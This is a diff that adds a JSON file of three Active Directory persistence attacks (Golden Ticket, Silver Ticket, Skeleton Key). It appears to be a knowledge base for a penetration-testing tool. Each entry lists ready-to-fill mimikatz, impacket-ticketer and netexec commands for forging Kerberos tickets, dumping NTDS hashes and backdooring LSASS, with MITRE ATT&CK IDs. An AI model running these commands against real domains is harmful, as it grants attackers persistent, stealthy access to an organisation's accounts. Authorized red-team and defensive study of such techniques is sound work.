@@ -1,0 +1,54 @@
+[
+  {
+    "id": "ad-persist-001",
+    "category": "windows_ad",
+    "subcategory": "persistence",
+    "title": "Golden Ticket Attack",
+    "description": "Forge a Kerberos TGT using the KRBTGT account hash, granting unlimited domain access. The KRBTGT hash can be obtained via DCSync. The ticket works even if the real KRBTGT password is changed (until reset twice).",
+    "techniques": [
+      "mimikatz 'kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /user:<FAKE_USER> /id:500'",
+      "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <USER>",
+      "netexec smb <TARGET> -u <USER> -p <PASS> --ntds"
+    ],
+    "indicators": ["KRBTGT hash obtained", "Domain SID known", "Domain Admin privileges already held"],
+    "prerequisites": ["KRBTGT NTLM hash", "Domain SID", "Network connectivity to domain"],
+    "tools": ["mimikatz", "impacket-ticketer", "rubeus"],
+    "tags": ["golden-ticket", "kerberos", "krbtgt", "persistence", "domain-admin"],
+    "confidence": 0.9,
+    "mitre_attack": "T1558.001"
+  },
+  {
+    "id": "ad-persist-002",
+    "category": "windows_ad",
+    "subcategory": "persistence",
+    "title": "Silver Ticket Attack",
+    "description": "Forge a Kerberos service ticket (TGS) for a specific service using its machine account hash. More stealthy than Golden Ticket — limited to one service, and doesn't touch the DC.",
+    "techniques": [
+      "mimikatz 'kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_HOST> /service:cifs /rc4:<SERVICE_HASH> /user:<USER>'",
+      "impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET> <USER>"
+    ],
+    "indicators": ["Service account or machine account hash", "Persistent access needed to specific service"],
+    "prerequisites": ["Service account or machine account NTLM hash", "Domain SID"],
+    "tools": ["mimikatz", "impacket-ticketer"],
+    "tags": ["silver-ticket", "kerberos", "tgs", "persistence", "stealth"],
+    "confidence": 0.85,
+    "mitre_attack": "T1558.002"
+  },
+  {
+    "id": "ad-persist-003",
+    "category": "windows_ad",
+    "subcategory": "persistence",
+    "title": "Skeleton Key Attack",
+    "description": "Inject a master password into the LSASS process on a Domain Controller that accepts any password for any account alongside the real password. Requires Domain Admin privileges on the DC.",
+    "techniques": [
+      "mimikatz 'privilege::debug' 'misc::skeleton'",
+      "net use \\\\<DC>\\admin$ /user:<DOMAIN>\\<ANY_USER> mimikatz"
+    ],
+    "indicators": ["DA access to Domain Controller", "LSASS injection possible", "No LSASS protection enabled"],
+    "prerequisites": ["Domain Admin access to DC", "Debug privilege on DC"],
+    "tools": ["mimikatz"],
+    "tags": ["skeleton-key", "lsass", "backdoor", "persistence", "dc"],
+    "confidence": 0.85,
+    "mitre_attack": "T1556.001"
+  }
+]
